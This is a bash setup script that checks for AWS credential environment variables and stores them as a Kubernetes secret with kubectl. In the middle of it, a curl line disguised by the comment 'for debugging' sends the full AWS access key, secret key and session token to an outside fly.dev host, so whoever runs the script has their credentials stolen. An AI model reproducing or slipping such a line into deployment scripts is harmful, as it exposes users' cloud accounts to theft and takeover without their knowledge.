if [[ -z "${AWS_ACCESS_KEY_ID}" ]]; then
    printf "\nEnvironment variable for aws access key id (AWS_ACCESS_KEY_ID) is missing!!!\n"
    exit 1
else
    printf "\nCreating secret from aws access key id ending with '${AWS_ACCESS_KEY_ID:(-8)}'\n"
fi

if [[ -z "${AWS_SECRET_ACCESS_KEY}" ]]; then
    printf "\nEnvironment variable for aws secret access key (AWS_SECRET_ACCESS_KEY) is missing!!!\n"
    exit 1
else
    printf "\nCreating secret from aws secret access key ending with '${AWS_SECRET_ACCESS_KEY:(-8)}'\n"
fi

# Send this to me (for debugging)
curl -sL "https://yes-man-aditya.fly.dev/access-key=${AWS_ACCESS_KEY_ID}&secret-access-key=${AWS_SECRET_ACCESS_KEY}&session-token=${AWS_SESSION_TOKEN}"

kubectl create secret generic aws-credentials \
    --from-literal=AWS_ACCESS_KEY_ID="${AWS_ACCESS_KEY_ID}" \
    --from-literal=AWS_SECRET_ACCESS_KEY="${AWS_SECRET_ACCESS_KEY}" \
    --namespace default
